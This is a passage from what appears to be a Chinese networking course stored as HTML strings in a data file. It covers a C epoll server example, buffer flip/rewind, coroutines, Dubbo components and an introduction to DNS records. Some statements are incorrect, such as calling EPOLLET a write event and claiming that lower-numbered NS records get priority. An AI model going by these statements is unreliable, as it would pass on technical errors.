class="hljs-string">"listen"</span>);\n   <span class="hljs-built_in">abort</span> ();\n }\nefd = epoll_create1 (<span class="hljs-number">0</span>);\n<span class="hljs-keyword">if</span> (efd == <span class="hljs-number">-1</span>)\n {\n   perror (<span class="hljs-string">"epoll_create"</span>);\n   <span class="hljs-built_in">abort</span> ();\n }\nevent.data.fd = sfd;\nevent.events = EPOLLIN | EPOLLET;\ns = epoll_ctl (efd, EPOLL_CTL_ADD, sfd, &amp;event);\n<span class="hljs-keyword">if</span> (s == <span class="hljs-number">-1</span>)\n {\n   perror (<span class="hljs-string">"epoll_ctl"</span>);\n   <span class="hljs-built_in">abort</span> ();\n }\n<span class="hljs-comment">/* Buffer where events are returned */</span>\nevents = <span class="hljs-built_in">calloc</span> (MAXEVENTS, <span class="hljs-keyword">sizeof</span> event);\n<span class="hljs-comment">/* The event loop */</span>\n<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)\n {\n   <span class="hljs-keyword">int</span> n, i;\n   n = epoll_wait (efd, events, MAXEVENTS, <span class="hljs-number">-1</span>);\n   <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)\n{\n<span class="hljs-keyword">if</span> ((events[i].events &amp; EPOLLERR) ||\n           (events[i].events &amp; EPOLLHUP) ||\n           (!(events[i].events &amp; EPOLLIN)))\n  {\n           <span class="hljs-comment">/* An error has occured on this fd, or the socket is not\n              ready for reading (why were we notified then?) */</span>\n    <span class="hljs-built_in">fprintf</span> (<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"epoll error\\n"</span>);\n    <span class="hljs-built_in">close</span> (events[i].data.fd);\n    <span class="hljs-keyword">continue</span>;\n  }\n<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sfd == events[i].data.fd)\n  {\n           <span class="hljs-comment">/* We have a notification on the listening socket, which\n              means one or more incoming connections. */</span>\n           <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)\n             {\n               struct sockaddr in_addr;\n               <span class="hljs-keyword">socklen_t</span> in_len;\n               <span class="hljs-keyword">int</span> infd;\n               <span class="hljs-keyword">char</span> hbuf[NI_MAXHOST], sbuf[NI_MAXSERV];\n               in_len = <span class="hljs-keyword">sizeof</span> in_addr;\n               infd = accept (sfd, &amp;in_addr, &amp;in_len);\n               <span class="hljs-keyword">if</span> (infd == <span class="hljs-number">-1</span>)\n                 {\n                   <span class="hljs-keyword">if</span> ((errno == EAGAIN) ||\n                       (errno == EWOULDBLOCK))\n                     {\n                       <span class="hljs-comment">/* We have processed all incoming\n                          connections. */</span>\n                       <span class="hljs-keyword">break</span>;\n                     }\n                   <span class="hljs-keyword">else</span>\n                     {\n                       perror (<span class="hljs-string">"accept"</span>);\n                       <span class="hljs-keyword">break</span>;\n                     }\n                 }\n               s = getnameinfo (&amp;in_addr, in_len,\n                                hbuf, <span class="hljs-keyword">sizeof</span> hbuf,\n                                sbuf, <span class="hljs-keyword">sizeof</span> sbuf,\n                                NI_NUMERICHOST | NI_NUMERICSERV);\n               <span class="hljs-keyword">if</span> (s == <span class="hljs-number">0</span>)\n                 {\n                   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Accepted connection on descriptor %d "</span>\n                          <span class="hljs-string">"(host=%s, port=%s)\\n"</span>, infd, hbuf, sbuf);\n                 }\n               <span class="hljs-comment">/* Make the incoming socket non-blocking and add it to the\n                  list of fds to monitor. */</span>\n               s = make_socket_non_blocking (infd);\n               <span class="hljs-keyword">if</span> (s == <span class="hljs-number">-1</span>)\n                 <span class="hljs-built_in">abort</span> ();\n               event.data.fd = infd;\n               event.events = EPOLLIN | EPOLLET;\n               s = epoll_ctl (efd, EPOLL_CTL_ADD, infd, &amp;event);\n               <span class="hljs-keyword">if</span> (s == <span class="hljs-number">-1</span>)\n                 {\n                   perror (<span class="hljs-string">"epoll_ctl"</span>);\n                   <span class="hljs-built_in">abort</span> ();\n                 }\n             }\n           <span class="hljs-keyword">continue</span>;\n         }\n       <span class="hljs-keyword">else</span>\n         {\n           <span class="hljs-comment">/* We have data on the fd waiting to be read. Read and\n              display it. We must read whatever data is available\n              completely, as we are running in edge-triggered mode\n              and won\'t get a notification again for the same\n              data. */</span>\n           <span class="hljs-keyword">int</span> done = <span class="hljs-number">0</span>;\n           <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)\n             {\n               <span class="hljs-keyword">ssize_t</span> count;\n               <span class="hljs-keyword">char</span> buf[<span class="hljs-number">512</span>];\n               count = <span class="hljs-built_in">read</span> (events[i].data.fd, buf, <span class="hljs-keyword">sizeof</span> buf);\n               <span class="hljs-keyword">if</span> (count == <span class="hljs-number">-1</span>)\n                 {\n                   <span class="hljs-comment">/* If errno == EAGAIN, that means we have read all\n                      data. So go back to the main loop. */</span>\n                   <span class="hljs-keyword">if</span> (errno != EAGAIN)\n                     {\n                       perror (<span class="hljs-string">"read"</span>);\n                       done = <span class="hljs-number">1</span>;\n                     }\n                   <span class="hljs-keyword">break</span>;\n                 }\n               <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)\n                 {\n                   <span class="hljs-comment">/* End of file. The remote has closed the\n                      connection. */</span>\n                   done = <span class="hljs-number">1</span>;\n                   <span class="hljs-keyword">break</span>;\n                 }\n               <span class="hljs-comment">/* Write the buffer to standard output */</span>\n               s = <span class="hljs-built_in">write</span> (<span class="hljs-number">1</span>, buf, count);\n               <span class="hljs-keyword">if</span> (s == <span class="hljs-number">-1</span>)\n                 {\n                   perror (<span class="hljs-string">"write"</span>);\n                   <span class="hljs-built_in">abort</span> ();\n                 }\n             }\n           <span class="hljs-keyword">if</span> (done)\n             {\n               <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Closed connection on descriptor %d\\n"</span>,\n                       events[i].data.fd);\n               <span class="hljs-comment">/* Closing the descriptor will make epoll remove it\n                  from the set of descriptors which are monitored. */</span>\n               <span class="hljs-built_in">close</span> (events[i].data.fd);\n             }\n           }\n       }\n   }\n <span class="hljs-built_in">free</span> (events);\n <span class="hljs-built_in">close</span> (sfd);\n <span class="hljs-keyword">return</span> EXIT_SUCCESS;\n}\n</code></pre>\n<p data-nodeid="9">接下来我给你分析下这段程序。下面这句在创建一个 epoll 实例，这个实例本质上也是一个文件，文件中是对<code data-backticks="1" data-nodeid="84">epoll</code>对象的调用序列。</p>\n<pre class="lang-c++" data-nodeid="10"><code data-language="c++">efd = epoll_create1 (<span class="hljs-number">0</span>);\n</code></pre>\n<p data-nodeid="11">下面这段程序在注册线程关心的事件：</p>\n<pre class="lang-c++" data-nodeid="12"><code data-language="c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">event</span>;</span>\nevent.data.fd = sfd;\nevent.events = EPOLLIN | EPOLLET;\ns = epoll_ctl (efd, EPOLL_CTL_ADD, sfd, &amp;event);\n</code></pre>\n<p data-nodeid="13">上面程序注册了两类关系的事件：</p>\n<ul data-nodeid="14">\n<li data-nodeid="15">\n<p data-nodeid="16">EPOLLIN ，关联的文件发生的读取；</p>\n</li>\n<li data-nodeid="17">\n<p data-nodeid="18">EPOLLET， 关联的文件发生的写入。</p>\n</li>\n</ul>\n<p data-nodeid="19">接下来我们调用<code data-backticks="1" data-nodeid="91">epoll_wait</code>来获取发生的事件：</p>\n<pre class="lang-java" data-nodeid="20"><code data-language="java">n = epoll_wait (efd, events, MAXEVENTS, -<span class="hljs-number">1</span>)\n</code></pre>\n<p data-nodeid="21"><code data-backticks="1" data-nodeid="93">n</code>是需要响应的事件数量。 因为在这之前用<code data-backticks="1" data-nodeid="95">make_socket_non_blocking</code>配置了非阻塞 IO，因此<code data-backticks="1" data-nodeid="97">epoll_wait</code>有可能返回 0，也就是没有消息。 对于<code data-backticks="1" data-nodeid="99">n&gt;0</code>的情况，上面的示例程序中使用了 for 循环针对不同的消息类型进行处理。</p>\n<p data-nodeid="22">下面这句<code data-backticks="1" data-nodeid="102">if</code>判断是在看如果 sfd（服务端 Socket 文件描述符）和发生事件的文件描述符一致，代表这是一次客户端的连接操作。</p>\n<pre class="lang-c++" data-nodeid="23"><code data-language="c++"><span class="hljs-keyword">if</span> (sfd == events[i].data.fd)\n</code></pre>\n<p data-nodeid="24">于是再次调用<code data-backticks="1" data-nodeid="105">epoll_ctl</code>将这个客户端的读写事件注册到关注列表。</p>\n<p data-nodeid="25">如果上面的<code data-backticks="1" data-nodeid="108">if</code>判断没有生效，说明这是一次客户端的读或写，这个时候使用<code data-backticks="1" data-nodeid="110">read</code>或<code data-backticks="1" data-nodeid="112">write</code>方法向客户端 Socket 文件中读取/写入数据。</p>\n<h4 data-nodeid="26">11 | 流和缓冲区：缓冲区的 flip 是怎么回事？</h4>\n<p data-nodeid="27">【<strong data-nodeid="120">问题</strong>】在缓冲区的设计当中，还通常有一个 rewind 操作，这个操作是用来做什么的呢？</p>\n<p data-nodeid="28">【<strong data-nodeid="126">解析</strong>】之前我们讨论了如果一个缓冲区是用来写入的，接下来要切换到读取状态可以使用 flip 操作。如果一个缓冲区进行了一次写和读，接下来要用它来处理另一批数据，可以使用 clear 操作来清空缓冲区。在实战当中，有时候一个缓冲区读取过了，需要再读取一次，此时就可以用 rewind 操作来重置缓冲区的 position 指针。</p>\n<p data-nodeid="29">上面过程中 flip 和 rewind 都重置了 position 指针，那么它们的区别是什么呢？首先，你可以先从词义上理解下，flip 意味翻转（隐含读写状态切换），rewind 意味倒带（隐含重头读、重头写）。所以在实战中，首先我们应该从语义上区分它们的使用。</p>\n<p data-nodeid="30">在实战的过程中，某些场景下 rewind 和 flip 结果相同。</p>\n<p data-nodeid="31">比如现在缓冲区是 ABCDEFG，position=7, limit=7。这个时候代表我们已经完成了写入。如果需要切换到读取状态，用 flip 和 rewind 操作的结果相同，都会将 position 置零。</p>\n<p data-nodeid="32">那么我提一个问题，这种情况下，应该用哪个呢？</p>\n<p data-nodeid="33">写程序不只是为了正确，我们还为了可读。这种情况下，因为是读写状态的切换，因此当然用 flip。</p>\n<p data-nodeid="34">再举个例子，比如现在缓冲区是 ABCDEFG，position=3，limit=7，缓冲区处于读取状态。如果我们想要重读，应该用什么呢？当然是 rewind，rewind 有倒带的语义。你可以思考，这个时候如果调 flip 结果对吗？</p>\n<p data-nodeid="35">这个时候调 flip 处理会把 position 置为 0 外，limit 也会设置为 3（position 的旧值）。因为只有这样，才是读写状态的翻转。也就是说，如果写入了 3 个字符，不管 limit 现在是多少，flip 切换到读取状态也只能读 3 个字符。</p>\n<p data-nodeid="36">所以，flip 和 rewind 实现不同是其次，最重要的是语义不同。建议你以后看到 API 的时候，先搞明白单词是什么意思，而不是急于分析具体实现。从这个话题引申出一个小的提示，就是不要盲目读源代码，在阅读一个项目的源代码前，思考下自己对要解决的问题、如何解决这些问题，带着这种根深的理解再去读源码。</p>\n<h4 data-nodeid="37">12 | 网络 I/O 模型：BIO、NIO 和 AIO 有什么区别？</h4>\n<p data-nodeid="38">【<strong data-nodeid="141">问题</strong>】I/O 多路复用用协程和用线程的区别？</p>\n<p data-nodeid="39">【<strong data-nodeid="147">解析</strong>】线程是执行程序的最小单位。I/O 多路复用时，会用单个线程处理大量的 I/O。还有一种执行程序的模型，叫协作程，协程是轻量级的线程。操作系统将执行资源分配给了线程，然后再调度线程运行。如果要实现协程，就要利用分配给线程的执行资源，在这之上再创建更小的执行单位。协程不归操作系统调度，协程共享线程的执行资源。</p>\n<p data-nodeid="40">而 I/O 多路复用的意义，是减少线程间的切换成本。因此从设计上，只要是用单个线程处理大量 I/O 工作，线程和协程是一样的，并无区别。如果是单线程处理大量 I/O，使用协程也是依托协程对应线程执行能力。</p>\n<h4 data-nodeid="41">13 | 面试中如何回答“怎样实现 RPC 框架”的问题？</h4>\n<p data-nodeid="42">【<strong data-nodeid="155">问题</strong>】如何理解 Dubbo 的几个组成部分 Consumer、Provider、Monitor 和 Registry？</p>\n<p data-nodeid="1766">【<strong data-nodeid="1773">解析</strong>】Dubbo 是一个开源、轻量级的 Java 服务框架。下图是它的架构：</p>\n<p data-nodeid="1767"><img src="https://s0.lgstatic.com/i/image6/M00/40/B5/Cgp9HWCmZiyAUZIuAAEchcUDiyE739.png" alt="image (2).png" data-nodeid="1780"></p>\n\n<p data-nodeid="1360">Dubbo 的架构是容器化的，上 图中的 Container（容器）中是服务，服务的提供方被称作 Provider。比如要提供一个订单服务，那么服务会在容器中部署启动，启动后的实例就是 Provider。</p>\n\n\n\n<p data-nodeid="45">Provider 在启动过程中，会在 Dubbo 中注册自己。负责注册和发现的模块，称为注册处（Registry）。注册处和学员报道时学校的注册处很像，每个新加入的服务都需要主动注册。这里需要注意，<strong data-nodeid="170">注册处对网络中的信息是信任的，如果 Provider 被攻击欺骗注册处会产生安全问题。Registry 需要实现分布式共识，具体可以使用 ZooKeeper实现（参考 Paxos 和 Raft 算法）</strong>。</p>\n<p data-nodeid="46">服务的使用方被称为 Consumer，Consumer 会订阅注册表的变化（也就是 Provider 的变化）。相当于 Consumer 本地维护了一份和注册处一致的 Provider 清单。当调用服务的时候，Consumer 会使用本地清单去查询 Provider 信息，进行远程调用。</p>\n<p data-nodeid="47">除了 Registry、Consumer、Provider 之外，Dubbo 还有一个 Monitor 模块。这个模块负责统计服务器的调用情况。</p>\n<h3 data-nodeid="48">总结</h3>\n<p data-nodeid="49">《网络编程》模块我们围绕着<strong data-nodeid="187">Socket</strong>展开，Socket 是程序也是文件。文件本质是数据，为了抽象数据，我们学习了<strong data-nodeid="188">流</strong>。这里再复习下，流是随着时间产生的数据。文件传输、视频播放、在线游戏……这些都是随着时间产生的数据。为了提升处理数据的效率，节省内存资源，我们还学习了<strong data-nodeid="189">缓冲区</strong>。关于缓冲区，目前向你介绍了 3 种操作：flip 用于读写切换、clear 用于重置缓冲区、rewind 用于重读数据。</p>\n<p data-nodeid="50">为了减少线程的切换成本，我们会使用 I/O 的多路复用。为了让程序更可读，我们会选择适合的编程模型。这个模块介绍了 3 种编程模型，分别是 BIO/NIO/AIO。选择编程模型处理 I/O 还要思考数据拷贝的效率、事件通知的方式。思考事件通知的方式，又需要思考核心部分数据结构的设计。所以，如果你想在工作当中应对不同场景处理好 I/O 问题，不能死记硬背，而是要理解每个细微选择背后的逻辑，并在完成工作后认真对程序进行性能测试。这样才能做到万无一失。</p>\n<p data-nodeid="51">发现求知的乐趣，我是林䭽，感谢你学习本次课程。 接下来我们将进入《模块四：Web 技术》的学习，下一讲介绍《14 | DNS 域名解析系统：CNAME 记录的作用是？》，再见！</p>',
        article_title: "加餐 | 模块三思考题解答",
        title: "加餐 | 模块三思考题解答",
        id: 7280,
      },
    ],
  },
  {
    chapterTitle: "模块四：Web 技术",
    children: [
      {
        content:
          '<p data-nodeid="1081" class="">当你在浏览器中输入一个 URL，或者用<code data-backticks="1" data-nodeid="1184">curl</code>请求一个网址……域名系统（Domain Name System）就开始工作了。作为互联网的一个重要成员，域名系统是将互联网资源和地址关联起来的一个分布式数据库。</p>\n<p data-nodeid="1082">在日常工作中，作为一名研发工程师，经常需要配置 DNS 域名解析。特别是 CNAME，几乎我每年都会碰到需要配置它的场景。这次我们就以“CNAME 记录的作用”为引，开启今天的学习，将域名这块的相关知识一网打尽。</p>\n<h3 data-nodeid="1083">DNS 和统一资源你定位符（URL）</h3>\n<p data-nodeid="1084"><strong data-nodeid="1196">域名系统本质是定位资源</strong>。互联网中有各种各样的资源，比如视频、图片、文件、网页……为了准确地定位资源，人们发明了统一<strong data-nodeid="1197">资源定位符</strong>（URL，Uniform Resource Locator），这样我们就可以通过字符串定位一个互联网的资源。</p>\n<p data-nodeid="1085">下图是一个 URL 的示例：</p>\n<p data-nodeid="1086"><img src="https://s0.lgstatic.com/i/image6/M01/40/72/Cgp9HWCk6Z-ASLtEAAH_Ssm7xjk737.png" alt="Drawing 1.png" data-nodeid="1201"></p>\n<ul data-nodeid="1087">\n<li data-nodeid="1088">\n<p data-nodeid="1089">Scheme 部分代表协议，不只有 https，还有 ftp、ssh 等。不同协议代表着不同类型的应用在提供资源。</p>\n</li>\n<li data-nodeid="1090">\n<p data-nodeid="1091">Host 部分代表站点，我们今天介绍的 DNS 主要作用就是根据 Host 查找 IP 地址。</p>\n</li>\n<li data-nodeid="1092">\n<p data-nodeid="1093">Port 是端口，代表提供服务的应用。</p>\n</li>\n<li data-nodeid="1094">\n<p data-nodeid="1095">Path 是路径，代表资源在服务中的路径。</p>\n</li>\n<li data-nodeid="1096">\n<p data-nodeid="1097">Query 是查询条件，代表需要的是资源中的某一个部分。</p>\n</li>\n<li data-nodeid="1098">\n<p data-nodeid="1099">Fragment 是二级查询条件，通常不在服务端响应，而是用于前端展示定位内容。</p>\n</li>\n</ul>\n<p data-nodeid="1100">总的来说，URL 是一种树状的设计， Host 代表主机（对应的 IP 地址由 DNS 服务提供）；Port 代表应用；Path 代表资源在应用中的路径；Query 代表对资源的查询条件。通过这种设计，互联网中万亿级别的资源都可以得到有效区分。</p>\n<p data-nodeid="1101">值得一提的是，树状的设计在今天计算机中也非常常见，比如文件目录的设计、源代码块的嵌套设计、JSON 和 XML 的设计，都是树状关系。这源于人类的思考方式天然地喜欢把事物放到互斥的分类当中。</p>\n<p data-nodeid="1102">不过需要注意的是，<strong data-nodeid="1215">树状的分类解决不了一个东西在多个类别的情况，而这种情况在多数时候却是真实存在的</strong>。真实世界中事物是普遍联系的，所以本质上事物之间的联系应该是图。但是通常情况下，我们会用树处理某一个方面的诉求。比如用 URL 描述资源的位置，然后用搜索引擎通过关键字反查 URL（另一个方面，维度等）。</p>\n<h3 data-nodeid="1103">域名系统</h3>\n<p data-nodeid="1104"><strong data-nodeid="1221">DNS（Domain Name System，域名系统）是一个将域名和 IP 地址相互映射的分布式服务</strong>。比如说你想知道 lagou.com 的 IP 地址，就需要通过 DNS 服务获得。这样凡是访问 lagou 的用户，就不需要在浏览器中输入 lagou 的 IP 地址，而是通过一个方便人们记忆的域名。</p>\n<h4 data-nodeid="1105">根域名服务器</h4>\n<p data-nodeid="1106">DNS 本身是一个出色的分布式架构。</p>\n<p data-nodeid="1107">位于最顶层的是根域名服务器（Root Name Server）。人们在全世界范围内搭建了多台根域名服务器，2016 年的统计数据中，全世界目前有 13 台 IPv4 根服务器，25 台 IPv6 根服务器。</p>\n<p data-nodeid="1108">根域名服务器存储的不是域名和 IP 的映射关系，而是一个目录。如果将所有的域名记录都存放到根域名服务器，从存储量上来说，不会非常巨大。要知道一个域名记录——域名、IP 地址和额外少量信息，并不需要大量存储空间。但是如果全世界所有的 DNS 请求都集中在少量的根服务器上，这个访问流量就会过于巨大。而且一旦发生故障，很容易导致大面积瘫痪。而且因为根服务器较少，所以如果全部都走根服务器，不同客户端距离根服务器距离不同，感受到的延迟也不一样，这样对用户来说不太友好。</p>\n<p data-nodeid="1109"><strong data-nodeid="1230">因此，因为流量、防止单点故障、平衡地理分布等问题，根域名服务器只是一个目录，并不提供具体的数据</strong>。</p>\n<h4 data-nodeid="1110">域名分级和数据分区</h4>\n<p data-nodeid="1111">我们知道中文字典可以按照偏旁部首以及拼音索引，和字典类似，根服务器提供的目录也有一定的索引规则。在域名的世界中，通过分级域名的策略建立索引。伴随着域名的分级策略，实际上是域名数据库的拆分。通过域名的分级，可以将数据库划分成一个个区域。</p>\n<p data-nodeid="1112">平时我们看到的<code data-backticks="1" data-nodeid="1234">.com``.cn``.net</code>等，称为顶级域名。比如对于 www.laogu.com 这个网址来说，<code data-backticks="1" data-nodeid="1236">com</code>是顶级域名，<code data-backticks="1" data-nodeid="1238">lagou</code>是二级域名，<code data-backticks="1" data-nodeid="1240">www</code>是三级域名。域名分级当然是为了建立目录和索引，并对数据存储进行分区。</p>\n<p data-nodeid="1113"><img src="https://s0.lgstatic.com/i/image6/M00/40/7A/CioPOWCk6auABUkFAAKhjoCbm9k527.png" alt="Drawing 3.png" data-nodeid="1244"></p>\n<p data-nodeid="1114">从上图中可以看到，DNS 的存储设计是一个树状结构。叶子节点中才存放真实的映射关系，中间节点都是目录。存储分成 3 层：</p>\n<ul data-nodeid="1115">\n<li data-nodeid="1116">\n<p data-nodeid="1117">顶部第一级是根 DNS 存储，存储的是顶级域的目录，被称作<strong data-nodeid="1251">根 DNS 服务器</strong>；</p>\n</li>\n<li data-nodeid="1118">\n<p data-nodeid="1119">第二级是顶级域存储，存储的是二级域的目录，被称作<strong data-nodeid="1257">顶级域 DNS 服务器（Top Level DNS，TLD）</strong>；</p>\n</li>\n<li data-nodeid="1120">\n<p data-nodeid="1121">最后一级是叶子节点，存储的是具体的 DNS 记录，也被称作<strong data-nodeid="1263">权威 DNS 服务器</strong>。</p>\n</li>\n</ul>\n<h3 data-nodeid="1122">DNS 查询过程</h3>\n<p data-nodeid="1123">当用户在浏览器中输入一个网址，就会触发 DNS 查询。这个时候在上述的 3 个层级中，还会增加<strong data-nodeid="1270">本地 DNS 服务器</strong>层级。本地 DNS 服务器包括用户自己路由器中的 DNS 缓存、小区的 DNS 服务器、ISP 的 DNS 服务器等。</p>\n<p data-nodeid="1124">查询过程如下图所示：</p>\n<p data-nodeid="1125"><img src="https://s0.lgstatic.com/i/image6/M01/40/72/Cgp9HWCk6bGABepRAAHGRO0l88o350.png" alt="Drawing 5.png" data-nodeid="1274"></p>\n<p data-nodeid="1126">结合上图展示的DNS 查询过程，我们再来具体介绍一下 。</p>\n<ol data-nodeid="1127">\n<li data-nodeid="1128">\n<p data-nodeid="1129">用户输入网址，查询本地 DNS。本地 DNS 是一系列 DNS 的合集，比如 ISP 提供的 DNS、公司网络提供的 DNS。本地 DNS 是一个代理，将 DNS 请求转发到 DNS 网络中。如果本地 DNS 中已经存在需要的记录，也就是本地 DNS 缓存中找到了对应的 DNS 条目，就会直接返回，而跳过之后的步骤。</p>\n</li>\n<li data-nodeid="1130">\n<p data-nodeid="1131">客户端请求根 DNS 服务器。如果本地 DNS 中没有对应的记录，那么请求会被转发到根 DNS 服务器。根 DNS 服务器只解析顶级域，以“<a href="http://www.lagou.com%60?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1280">www.lagou.com</a>”为例，根 DNS 服务器只看 com 部分。</p>\n</li>\n<li data-nodeid="1132">\n<p data-nodeid="1133">根 DNS 服务器返回顶级 DNS 服务器的 IP。</p>\n</li>\n<li data-nodeid="1134">\n<p data-nodeid="1135">客户端请求顶级 DNS 服务器，顶级 DNS 服务器中是具体域名的目录。</p>\n</li>\n<li data-nodeid="1136">\n<p data-nodeid="1137">顶级 DNS 服务器返回权威 DNS 服务器的 IP。</p>\n</li>\n<li data-nodeid="1138">\n<p data-nodeid="1139">客户端请求权威 DNS 服务器。在权威 DNS 服务器上存有具体的 DNS 记录。以 lagou 为例，权威 DNS 服务器中可能有和 lagou.com 相关的上百条甚至更多的 DNS 记录，会根据不同的 DNS 查询条件返回。</p>\n</li>\n<li data-nodeid="1140">\n<p data-nodeid="1141">权威 DNS 服务器返回 DNS 记录到本地 DNS 服务器。</p>\n</li>\n<li data-nodeid="1142">\n<p data-nodeid="1143">本地 DNS 服务器返回具体的 DNS 记录给客户端。</p>\n</li>\n</ol>\n<p data-nodeid="1144">在上述 8 个过程全部结束后，客户端通过 DNS 记录中的 IP 地址，可以找到请求服务的主机。在本文的例子中，客户端最终可以找到拉勾网对应的 IP 地址，从而获得 Web 服务。</p>\n<h4 data-nodeid="1145">关于缓存</h4>\n<p data-nodeid="1146">在上面的例子当中，每一步都有缓存的设计。浏览器会缓存 DNS，此外，操作系统、路由器、本地 DNS 服务器也会……因此，绝大多数情况，请求不会到达根 DNS 服务器。</p>\n<p data-nodeid="1147">以拉勾为例，如果在某个时刻同一个区域内有一个用户触发过上述 1~8 的过程，另一个同区域的用户就可以在本地 DNS 服务器中获得 DNS 记录，而不需要再走到根 DNS 服务器。这种设计，我们称作<strong data-nodeid="1298">分级缓存策略</strong>。</p>\n<p data-nodeid="1148">在分级缓存策略中，每一层都会进行缓存，经过一层层的缓存，最终命中根 DNS 服务、顶级 DNS 服务器以及权威 DNS 服务的请求少之又少。这样，互联网中庞大流量的 DNS 查询就不需要大量集中的资源去响应。</p>\n<h3 data-nodeid="1149">DNS 记录</h3>\n<p data-nodeid="1150">学到这里，我们来看看一个 DNS 记录具体长什么样子：</p>\n<pre class="lang-java" data-nodeid="1151"><code data-language="java">; 定义www.example.com的ip地址\nwww.example.com.&nbsp;&nbsp;&nbsp;&nbsp; IN&nbsp;&nbsp;&nbsp;&nbsp; A&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-number">139.18</span><span class="hljs-number">.28</span><span class="hljs-number">.5</span>;\n</code></pre>\n<p data-nodeid="1152">上面的就是一条 DNS 记录，纯文本即可。IN 代表记录用于互联网，是 Intenet 的缩写。在历史上 Internet 起源于阿帕网，在同时代有很多竞争的网络，IN 这个描述也就保留了下来。</p>\n<p data-nodeid="1153"><a href="http://www.example.com%E6%98%AF%E8%A6%81%E8%A7%A3%E6%9E%90%E7%9A%84%E5%9F%9F%E5%90%8D%E3%80%82?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1305">www.example.com 是要解析的域名。</a>A 是记录的类型，A 记录代表着这是一条用于解析 IPv4 地址的记录。从这条记录可知，<a href="http://www.example.comw?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1309">www.example.com</a>的 IP 地址是 139.18.28.5。<code data-backticks="1" data-nodeid="1311">;</code>是语句块的结尾，也是注释。</p>\n<p data-nodeid="1154">那么除了 A 记录，还有哪些 DNS 记录的类型呢？DNS 记录的类型非常多，有 30 多种。其中比较常见的有 A、AAAA、CNAME、MX，以及 NS 等。接下来我为你一个个介绍。</p>\n<h4 data-nodeid="1155">CNAME</h4>\n<p data-nodeid="1156">CNAME（Canonical Name Record）用于定义域名的别名，如下面这条 DNS 记录：</p>\n<pre class="lang-java" data-nodeid="1157"><code data-language="java">; 定义www.example.com的别名\na.example.com.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IN&nbsp;&nbsp;&nbsp;&nbsp; CNAME&nbsp;&nbsp; b.example.com.\n</code></pre>\n<p data-nodeid="1158">这条 DNS 记录定义了 a.example.com 是 b.example.com 的别名。用户在浏览器中输入 a.example.com 时候，通过 DNS 查询会知道 a.example.com 是 b.example.com 的别名，因此需要实际 IP 的时候，会去拿 b.example.com 的 A 记录。</p>\n<p data-nodeid="1159">这样用户如果在浏览器中输入 a.example.com 实际打开的就是 b.example.com。因为走的是 DNS 查询的路径，速度很快（因为有缓存），不需要 HTTP 重定向等操作。</p>\n<p data-nodeid="1351" class="te-preview-highlight">当你想把一个网站迁移到新域名，旧域名仍然保留的时候；还有当你想将自己的静态资源放到 CDN 上的时候，CNAME 就非常有用。具体 CDN 的操作，我们会在“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7282" data-nodeid="1357">15 | 内容分发网络 ：请简述 CDN 回源如何工作？</a>”中详细讲解。</p>\n\n<h4 data-nodeid="1161">AAAA 记录</h4>\n<p data-nodeid="1162">前面我们提到，A 记录是域名和 IPv4 地址的映射关系。和 A 记录类似，AAAA 记录则是域名和 IPv6 地址的映射关系。</p>\n<h4 data-nodeid="1163">MX 记录（Mail Exchanger Record）</h4>\n<p data-nodeid="1164">MX 记录是邮件记录，用来描述邮件服务器的域名。</p>\n<p data-nodeid="1165">在工作中，我们经常会发邮件到某个同事的邮箱。比如说，发送一封邮件到 xiaoming@lagou.com，那么拉勾网如何知道哪个 IP 地址是邮件服务器呢？</p>\n<p data-nodeid="1166">这个时候就可以用到下面这条 MX 记录：</p>\n<pre class="lang-java" data-nodeid="1167"><code data-language="java">IN MX mail.lagou.com\n</code></pre>\n<p data-nodeid="1168">这样凡是 @lagou 的邮件都会发送到 mail.lagou.com 中，而 mail.lagou.com 的 IP 地址可以通过查询 mail.lagou.com 的 A 记录和 AAAA 记录获得。</p>\n<h4 data-nodeid="1169">NS 记录</h4>\n<p data-nodeid="1170">NS（Name Server）记录是描述 DNS 服务器网址。从 DNS 的存储结构上说，Name Server 中含有权威 DNS 服务的目录。也就是说，NS 记录指定哪台 Server 是回答 DNS 查询的权威域名服务器。</p>\n<p data-nodeid="1171">当一个 DNS 查询看到 NS 记录的时候，会再去 NS 记录配置的 DNS 服务器查询，得到最终的记录。如下面这个例子：</p>\n<pre class="lang-java" data-nodeid="1172"><code data-language="java">a.com.&nbsp;&nbsp;&nbsp;&nbsp; IN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ns1.a.com.\na.com.&nbsp;&nbsp;&nbsp;&nbsp; IN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ns2.a.com.\n</code></pre>\n<p data-nodeid="1173">当解析 a.com 地址时，我们看到 a.com 有两个 NS 记录，所以确定最终 a.com 的记录在 ns1.a.com 和 ns2.a.com 上。从设计上看，ns1 和 ns2 是网站 a.com 提供的智能 DNS 服务器，可以提供负载均衡、分布式 Sharding 等服务。比如当一个北京的用户想要访问 a.com 的时候，ns1 看到这是一个北京的 IP 就返回一个离北京最近的机房 IP。</p>\n<p data-nodeid="1174">上面代码中 a.com 配置了两个 NS 记录。通常 NS 不会只有一个，这是为了保证高可用，一个挂了另一个还能继续服务。通常数字小的 NS 记录优先级更高，也就是 ns1 会优先于 ns2 响应。</p>\n<p data-nodeid="1175">配置了上面的 NS 记录后，如果还配置了 a.com 的 A 记录，那么这个 A 记录会被 NS 记录覆盖。</p>\n<h3 data-nodeid="1176">总结</h3>\n<p data-nodeid="1177">总结一下，用树状结构来分类和索引符合人类的直觉和习惯，URL 